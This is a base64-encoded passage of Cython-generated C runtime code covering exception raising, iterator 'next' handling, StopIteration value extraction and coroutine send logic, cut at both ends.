YW5jZSBleGNlcHRpb24gbWF5IG5vdCBoYXZlIGEgc2VwYXJhdGUgdmFsdWUiKTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIHZhbHVlID0gdHlwZTtcbiAgICAgICAgdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpO1xuICAgIH0gZWxzZSBpZiAoUHlFeGNlcHRpb25DbGFzc19DaGVjayh0eXBlKSkge1xuICAgICAgICBQeU9iamVjdCAqaW5zdGFuY2VfY2xhc3MgPSBOVUxMO1xuICAgICAgICBpZiAodmFsdWUgJiYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHtcbiAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gKFB5T2JqZWN0KikgUHlfVFlQRSh2YWx1ZSk7XG4gICAgICAgICAgICBpZiAoaW5zdGFuY2VfY2xhc3MgIT0gdHlwZSkge1xuICAgICAgICAgICAgICAgIGludCBpc19zdWJjbGFzcyA9IFB5T2JqZWN0X0lzU3ViY2xhc3MoaW5zdGFuY2VfY2xhc3MsIHR5cGUpO1xuICAgICAgICAgICAgICAgIGlmICghaXNfc3ViY2xhc3MpIHtcbiAgICAgICAgICAgICAgICAgICAgaW5zdGFuY2VfY2xhc3MgPSBOVUxMO1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoaXNfc3ViY2xhc3MgPT0gLTEpKSB7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHR5cGUgPSBpbnN0YW5jZV9jbGFzcztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFpbnN0YW5jZV9jbGFzcykge1xuICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3M7XG4gICAgICAgICAgICBpZiAoIXZhbHVlKVxuICAgICAgICAgICAgICAgIGFyZ3MgPSBQeVR1cGxlX05ldygwKTtcbiAgICAgICAgICAgIGVsc2UgaWYgKFB5VHVwbGVfQ2hlY2sodmFsdWUpKSB7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgICAgICBhcmdzID0gdmFsdWU7XG4gICAgICAgICAgICB9IGVsc2VcbiAgICAgICAgICAgICAgICBhcmdzID0gUHlUdXBsZV9QYWNrKDEsIHZhbHVlKTtcbiAgICAgICAgICAgIGlmICghYXJncylcbiAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgIG93bmVkX2luc3RhbmNlID0gUHlPYmplY3RfQ2FsbCh0eXBlLCBhcmdzLCBOVUxMKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihhcmdzKTtcbiAgICAgICAgICAgIGlmICghb3duZWRfaW5zdGFuY2UpXG4gICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICB2YWx1ZSA9IG93bmVkX2luc3RhbmNlO1xuICAgICAgICAgICAgaWYgKCFQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHZhbHVlKSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjYWxsaW5nICVSIHNob3VsZCBoYXZlIHJldHVybmVkIGFuIGluc3RhbmNlIG9mICJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkJhc2VFeGNlcHRpb24sIG5vdCAlUiIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGUsIFB5X1RZUEUodmFsdWUpKTtcbiAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAicmFpc2U6IGV4Y2VwdGlvbiBjbGFzcyBtdXN0IGJlIGEgc3ViY2xhc3Mgb2YgQmFzZUV4Y2VwdGlvbiIpO1xuICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4gICAgaWYgKGNhdXNlKSB7XG4gICAgICAgIFB5T2JqZWN0ICpmaXhlZF9jYXVzZTtcbiAgICAgICAgaWYgKGNhdXNlID09IFB5X05vbmUpIHtcbiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gTlVMTDtcbiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGNhdXNlKSkge1xuICAgICAgICAgICAgZml4ZWRfY2F1c2UgPSBQeU9iamVjdF9DYWxsT2JqZWN0KGNhdXNlLCBOVUxMKTtcbiAgICAgICAgICAgIGlmIChmaXhlZF9jYXVzZSA9PSBOVUxMKVxuICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9IGVsc2UgaWYgKFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2soY2F1c2UpKSB7XG4gICAgICAgICAgICBmaXhlZF9jYXVzZSA9IGNhdXNlO1xuICAgICAgICAgICAgUHlfSU5DUkVGKGZpeGVkX2NhdXNlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgImV4Y2VwdGlvbiBjYXVzZXMgbXVzdCBkZXJpdmUgZnJvbSAiXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIkJhc2VFeGNlcHRpb24iKTtcbiAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9XG4gICAgICAgIFB5RXhjZXB0aW9uX1NldENhdXNlKHZhbHVlLCBmaXhlZF9jYXVzZSk7XG4gICAgfVxuICAgIFB5RXJyX1NldE9iamVjdCh0eXBlLCB2YWx1ZSk7XG4gICAgaWYgKHRiKSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuICAgICAgICBQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sodmFsdWUsIHRiKTtcbiNlbGlmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgICAgICBQeVRocmVhZFN0YXRlICp0c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4gICAgICAgIFB5T2JqZWN0KiB0bXBfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7XG4gICAgICAgIGlmICh0YiAhPSB0bXBfdGIpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRih0Yik7XG4gICAgICAgICAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAgICAgICAgIFB5X1hERUNSRUYodG1wX3RiKTtcbiAgICAgICAgfVxuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgICAgICBQeUVycl9GZXRjaCgmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpO1xuICAgICAgICBQeV9JTkNSRUYodGIpO1xuICAgICAgICBQeUVycl9SZXN0b3JlKHRtcF90eXBlLCB0bXBfdmFsdWUsIHRiKTtcbiAgICAgICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuI2VuZGlmXG4gICAgfVxuYmFkOlxuICAgIFB5X1hERUNSRUYob3duZWRfaW5zdGFuY2UpO1xuICAgIHJldHVybjtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKHZvaWQpIHtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGUpKVxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25leHQpO1xuICAgIHJldHVybiBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJdGVyX05leHRfUGxhaW4oUHlPYmplY3QgKml0ZXJhdG9yKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgUHlPYmplY3QgKm5leHQgPSBfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKCk7XG4gICAgaWYgKHVubGlrZWx5KCFuZXh0KSkgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhuZXh0LCBpdGVyYXRvciwgTlVMTCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbHNlXG4gICAgKHZvaWQpX19QeXhfR2V0QnVpbHRpbk5hbWU7IC8vIG9ubHkgZm9yIGVhcmx5IGxpbWl0ZWQgQVBJXG4gICAgaXRlcm5leHRmdW5jIGl0ZXJuZXh0ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKGl0ZXJhdG9yKTtcbiAgICBhc3NlcnQoaXRlcm5leHQpO1xuICAgIHJldHVybiBpdGVybmV4dChpdGVyYXRvcik7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYywgaW50IGl0ZXJuZXh0KSB7XG4gICAgaWYgKHZhbHVlID09IFB5X05vbmUpIHtcbiAgICAgICAgaWYgKGFzeW5jIHx8ICFpdGVybmV4dClcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoYXN5bmMgPyBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24gOiBQeUV4Y19TdG9wSXRlcmF0aW9uKTtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24odmFsdWUsIGFzeW5jKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYykge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuI2VuZGlmXG4gICAgUHlPYmplY3QgKmV4YztcbiAgICBQeU9iamVjdCAqZXhjX3R5cGUgPSBhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb247XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgaWYgKChQWV9WRVJTSU9OX0hFWCA+PSAoMHgwMzBDMDBBNikpIHx8IHVubGlrZWx5KFB5VHVwbGVfQ2hlY2sodmFsdWUpIHx8IFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBpZiAoUFlfVkVSU0lPTl9IRVggPj0gKDB4MDMwZTAwQTEpKSB7XG4gICAgICAgICAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeU9iamVjdCAqYXJnc190dXBsZSA9IFB5VHVwbGVfTmV3KDEpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzX3R1cGxlKSkgcmV0dXJuO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJnc190dXBsZSwgMCwgdmFsdWUpO1xuICAgICAgICAgICAgZXhjID0gUHlPYmplY3RfQ2FsbChleGNfdHlwZSwgYXJnc190dXBsZSwgTlVMTCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoYXJnc190dXBsZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgZXhjID0gdmFsdWU7XG4gICAgfVxuICAgICNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgaWYgKCFfX3B5eF90c3RhdGUtPmV4Y19pbmZvLT5leGNfdmFsdWUpXG4gICAgI2Vsc2VcbiAgICBpZiAoIV9fcHl4X3RzdGF0ZS0+ZXhjX3R5cGUpXG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgICBQeV9JTkNSRUYoZXhjX3R5cGUpO1xuICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV4Y190eXBlLCBleGMsIE5VTEwpO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgICNlbmRpZlxuI2Vsc2VcbiAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7XG4gICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47XG4jZW5kaWZcbiAgICBQeUVycl9TZXRPYmplY3QoZXhjX3R5cGUsIGV4Yyk7XG4gICAgUHlfREVDUkVGKGV4Yyk7XG59XG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4jaW5jbHVkZSA8ZnJhbWVvYmplY3QuaD5cbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMGE2ICYmICFkZWZpbmVkKFBZUFlfVkVSU0lPTilcbiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFXG4gICAgI2RlZmluZSBQeV9CVUlMRF9DT1JFIDFcbiAgI2VuZGlmXG4gICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCJcbiNlbmRpZlxuI2VuZGlmIC8vIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWRcbl9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7XG4jaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7XG4jZW5kaWZcbiAgICBQeV9DTEVBUihnZW4tPnlpZWxkZnJvbSk7XG59XG5zdGF0aWMgaW50IF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICoqcHZhbHVlKSB7XG4gICAgUHlPYmplY3QgKmV0LCAqZXYsICp0YjtcbiAgICBQeU9iamVjdCAqdmFsdWUgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RzdGF0ZSk7XG4gICAgX19QeXhfRXJyRmV0Y2goJmV0LCAmZXYsICZ0Yik7XG4gICAgaWYgKCFldCkge1xuICAgICAgICBQeV9YREVDUkVGKHRiKTtcbiAgICAgICAgUHlfWERFQ1JFRihldik7XG4gICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICAgICAgKnB2YWx1ZSA9IFB5X05vbmU7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICBpZiAobGlrZWx5KGV0ID09IFB5RXhjX1N0b3BJdGVyYXRpb24pKSB7XG4gICAgICAgIGlmICghZXYpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmIChsaWtlbHkoX19QeXhfSVNfVFlQRShldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7XG4gICAgICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgICAgICAgICB2YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHIoZXYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgZ290byBsaW1pdGVkX2FwaV9mYWlsdXJlO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIHZhbHVlID0gKChQeVN0b3BJdGVyYXRpb25PYmplY3QgKilldiktPnZhbHVlO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgUHlfREVDUkVGKGV2KTtcbiAgICAgICAgfVxuICAgICAgICBlbHNlIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGV2KSkpIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgdHVwbGVfc2l6ZSA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoZXYpO1xuICAgICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHR1cGxlX3NpemUgPCAwKSkge1xuICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodGIpO1xuICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihldik7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGV0KTtcbiAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgIGlmICh0dXBsZV9zaXplID49IDEpIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlUdXBsZV9HRVRfSVRFTShldiwgMCk7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgICAgICAgICB2YWx1ZSA9IFB5U2VxdWVuY2VfSVRFTShldiwgMCk7XG4jZWxzZVxuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGV2LCAwKTtcbiAgICAgICAgICAgICAgICBpZiAoIXZhbHVlKSBnb3RvIGxpbWl0ZWRfYXBpX2ZhaWx1cmU7XG4jZW5kaWZcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpO1xuICAgICAgICAgICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihldik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSBpZiAoIV9fUHl4X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHtcbiAgICAgICAgICAgIHZhbHVlID0gZXY7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseSh2YWx1ZSkpIHtcbiAgICAgICAgICAgIFB5X1hERUNSRUYodGIpO1xuICAgICAgICAgICAgUHlfREVDUkVGKGV0KTtcbiAgICAgICAgICAgICpwdmFsdWUgPSB2YWx1ZTtcbiAgICAgICAgICAgIHJldHVybiAwO1xuICAgICAgICB9XG4gICAgfSBlbHNlIGlmICghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkge1xuICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKGV0LCBldiwgdGIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5RXJyX05vcm1hbGl6ZUV4Y2VwdGlvbigmZXQsICZldiwgJnRiKTtcbiAgICBpZiAodW5saWtlbHkoIVB5T2JqZWN0X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7XG4gICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfWERFQ1JFRih0Yik7XG4gICAgUHlfREVDUkVGKGV0KTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyKGV2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUpO1xuI2Vsc2VcbiAgICB2YWx1ZSA9ICgoUHlTdG9wSXRlcmF0aW9uT2JqZWN0ICopZXYpLT52YWx1ZTtcbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuI2VuZGlmXG4gICAgUHlfREVDUkVGKGV2KTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgaWYgKHVubGlrZWx5KCF2YWx1ZSkpIHJldHVybiAtMTtcbiNlbmRpZlxuICAgICpwdmFsdWUgPSB2YWx1ZTtcbiAgICByZXR1cm4gMDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgbGltaXRlZF9hcGlfZmFpbHVyZTpcbiAgICBQeV9YREVDUkVGKGV0KTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiAgICBQeV9YREVDUkVGKGV2KTtcbiAgICByZXR1cm4gLTE7XG4jZW5kaWZcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FXG5fX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX3N0YXR1c19mcm9tX3Jlc3VsdChQeU9iamVjdCAqKnJldHZhbCkge1xuICAgIGlmICgqcmV0dmFsKSB7XG4gICAgICAgIHJldHVybiBQWUdFTl9ORVhUO1xuICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHJldHZhbCkgPT0gMCkpIHtcbiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7XG4gICAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkVcbnZvaWQgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSkge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICBQeV9DTEVBUihleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4jZWxzZVxuICAgIFB5T2JqZWN0ICp0LCAqdiwgKnRiO1xuICAgIHQgPSBleGNfc3RhdGUtPmV4Y190eXBlO1xuICAgIHYgPSBleGNfc3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0YiA9IGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICBleGNfc3RhdGUtPmV4Y190eXBlID0gTlVMTDtcbiAgICBleGNfc3RhdGUtPmV4Y192YWx1ZSA9IE5VTEw7XG4gICAgZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrID0gTlVMTDtcbiAgICBQeV9YREVDUkVGKHQpO1xuICAgIFB5X1hERUNSRUYodik7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKSAgKF9fUHl4X19Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pLCAoUHlPYmplY3QqKU5VTEwpXG5zdGF0aWMgdm9pZCBfX1B5eF9fQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiAgICBjb25zdCBjaGFyICptc2c7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBpZiAoKDApKSB7XG4gICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soKFB5T2JqZWN0KilnZW4pKSB7XG4gICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgYWxyZWFkeSBleGVjdXRpbmciO1xuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgfSBlbHNlIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KChQeU9iamVjdCopZ2VuKSkge1xuICAgICAgICBtc2cgPSAiYXN5bmMgZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjtcbiAgICAjZW5kaWZcbiAgICB9IGVsc2Uge1xuICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjtcbiAgICB9XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1ZhbHVlRXJyb3IsIG1zZyk7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlcm1pbmF0ZWRFcnJvcihQeU9iamVjdCAqZ2VuLCBQeU9iamVjdCAqdmFsdWUsIGludCBjbG9zaW5nKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihjbG9zaW5nKTtcbiAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICBpZiAoIWNsb3NpbmcgJiYgX19QeXhfQ29yb3V0aW5lX0NoZWNrKGdlbikpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgImNhbm5vdCByZXVzZSBhbHJlYWR5IGF3YWl0ZWQgY29yb3V0aW5lIik7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbikpXG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7XG4gICAgICAgIGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7XG4gICAgfVxufVxuc3RhdGljXG5fX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX1NlbmRFeChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXN1bHQsIGludCBjbG9zaW5nKSB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlO1xuICAgIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZTtcbiAgICBQeU9iamVjdCAqcmV0dmFsO1xuICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoc2VsZikpOyAgLy8gQ2FsbGVycyBzaG91bGQgZW5zdXJlIGlzX3J1bm5pbmdcbiAgICBpZiAodW5saWtlbHkoc2VsZi0+cmVzdW1lX2xhYmVsID09IC0xKSkge1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlc